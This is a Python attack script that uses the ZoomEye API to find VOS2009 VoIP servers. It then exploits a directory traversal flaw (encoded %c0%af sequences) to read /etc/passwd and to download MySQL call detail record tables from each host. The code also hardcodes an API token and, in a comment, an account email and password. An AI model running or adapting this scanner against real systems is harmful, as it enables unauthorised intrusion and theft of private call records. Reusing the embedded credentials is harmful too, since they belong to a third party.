#coding:utf-8
from datetime import timedelta,date,datetime
import requests
import json
import os
import time

#mongo数据库设置返回库，还得设置表
def mongo():
    conn=MongoClient('127.0.0.1', 27017)
    table = conn.zoomeye
    return table
    
##获取漏洞主机ip
def get_ip(title):
    ip_list = []
    for page in range(1000):
        urls = 'https://api.zoomeye.org/host/search?query=title='+title+'&page='+str(page)
        datas = {"Authorization": "JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6IjEyMTQ5OTcyMjVAcXEuY29tIiwiaWF0IjoxNTIxNjQ1MTQwLCJuYmYiOjE1MjE2NDUxNDAsImV4cCI6MTUyMTY4ODM0MH0.LcSpSSa72DTLyRRYmReVs6nXCWFHz3NrXMC58wxkdMQ"}
        data_encoded = json.dumps(datas)
        html = requests.get(urls,headers = datas)
        data = json.loads(str(html.text))
        print(page)
        try:   
            for i in data['matches']:
                dd = {'ip':i['ip'],'area':i['geoinfo']['country']['names']['zh-CN']}
                ip_list.append(i['ip'])
        except:
            break
    return ip_list
            

##获取token
def get_token(user,passwd):
    
    data = {
        "username": user,
        "password": passwd
        }
    data_encoded = json.dumps(data)
    data = requests.post(url='https://api.zoomeye.org/user/login',data = data_encoded)
    return(json.loads(data.text)['access_token'])


#生成日期列表 传入date:如(2018,03,06)
def gen_date(start):
    a = timedelta(days=1)
    task = []
    nowtime = (date(int(str(datetime.now())[:10].split('-')[0]),int(str(datetime.now())[:10].split('-')[1]),int(str(datetime.now())[:10].split('-')[2])))
    while start <= nowtime:
        task.append(str(start).replace('-',''))
        start+=a
    return task

##测试下载
def down_file_1(ip):
    frm_url = 'http://'+str(ip)+'/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af.\.%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/var/lib/mysql/vosdb/e_cdr_'+str(datetime.now())[:10].replace('-','')+'.frm'
    passwd_url = 'http://'+str(ip) +'/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd'
    try:
        html = requests.get(passwd_url).text
        if 'root'  in html:
            print(ip)
    except:
        pass
##    return frm_url

##写入本地文件夹,单ip,多个时间
def write_file(ip,date_list):
    big_url = []
    for riqi in date_list:
        myd_url = 'http://'+str(ip)+'/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/var/lib/mysql/vosdb/e_cdr_'+riqi+'.MYD'
        myi_url = 'http://'+str(ip)+'/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/var/lib/mysql/vosdb/e_cdr_'+riqi+'.MYI'
        frm_url = 'http://'+str(ip)+'/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/var/lib/mysql/vosdb/e_cdr_'+riqi+'.FRM'
        big_url.append(myd_url)
        big_url.append(myi_url)
        big_url.append(frm_url)
         
    for url in big_url:
        if not os.path.exists(os.path.join('zoom_eye_data',str(ip).replace('.','_'))):
            try:
                os.makedirs(os.path.join('zoom_eye_data',str(ip).replace('.','_')))
            except :
                pass
        else:
            try:   
                path = os.path.join('zoom_eye_data',str(ip).replace('.','_'))
                files = os.path.join(path,url.split('/')[-1])
                with open (files,'wb')as file:
                    data = requests.get(url).content
                    file.write(data)
            except:
                pass
          

if __name__=='__main__':
        #token
##    token = get_token('1214997225@qq.com','d1995012355555')
    
    #生成日期列表
    multi_date = gen_date(date(2018,1,1))
    
    #获取漏洞ip列表
    ip_list = get_ip('vos2009')
##    print(ip_list)
    for i in ip_list:
        down_file_1(i)
        
    


